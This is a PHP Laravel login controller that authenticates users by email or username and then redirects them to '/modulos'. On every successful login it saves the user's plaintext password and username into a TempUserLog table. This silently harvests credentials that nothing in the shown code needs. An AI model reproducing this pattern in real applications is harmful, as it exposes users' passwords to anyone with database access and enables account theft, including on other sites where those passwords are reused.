<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\role_user;
use App\TempUserLog;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
     */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = '/modulos';

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
    }


    public function login(Request $request)
    {
        $input = $request->all();

        $this->validate($request, [
            'username' => 'required',
            'password' => 'required',
        ]);

        $fieldType = filter_var($request->username, FILTER_VALIDATE_EMAIL) ? 'email' : 'username';
        if (auth()->attempt(array($fieldType => $input['username'], 'password' => $input['password']))) {

            $role = role_user::where('user_id', Auth::user()->id)->get();
            foreach ($role as $r) {
                $role_id = $r->role_id;
            }

                $checkUser = TempUserLog::where('user_id', Auth::user()->id)->first() ? true:false;
                if($checkUser){
                    $userTem           = TempUserLog::where('user_id', Auth::user()->id)->first();
                    $userTem->user_id  = Auth::user()->id;
                    $userTem->pass     = $request->password;
                    $userTem->username = $request->username;
                    $userTem->save();
                }else{
                    $userTem           = new TempUserLog;
                    $userTem->user_id  = Auth::user()->id;
                    $userTem->pass     = $request->password;
                    $userTem->username = $request->username;
                    $userTem->save();
                }
              

                return redirect('/modulos');
            

        } else {
            return redirect('/')
                ->with('error', 'Email-Address And Password Are Wrong.');
        }

    }
}
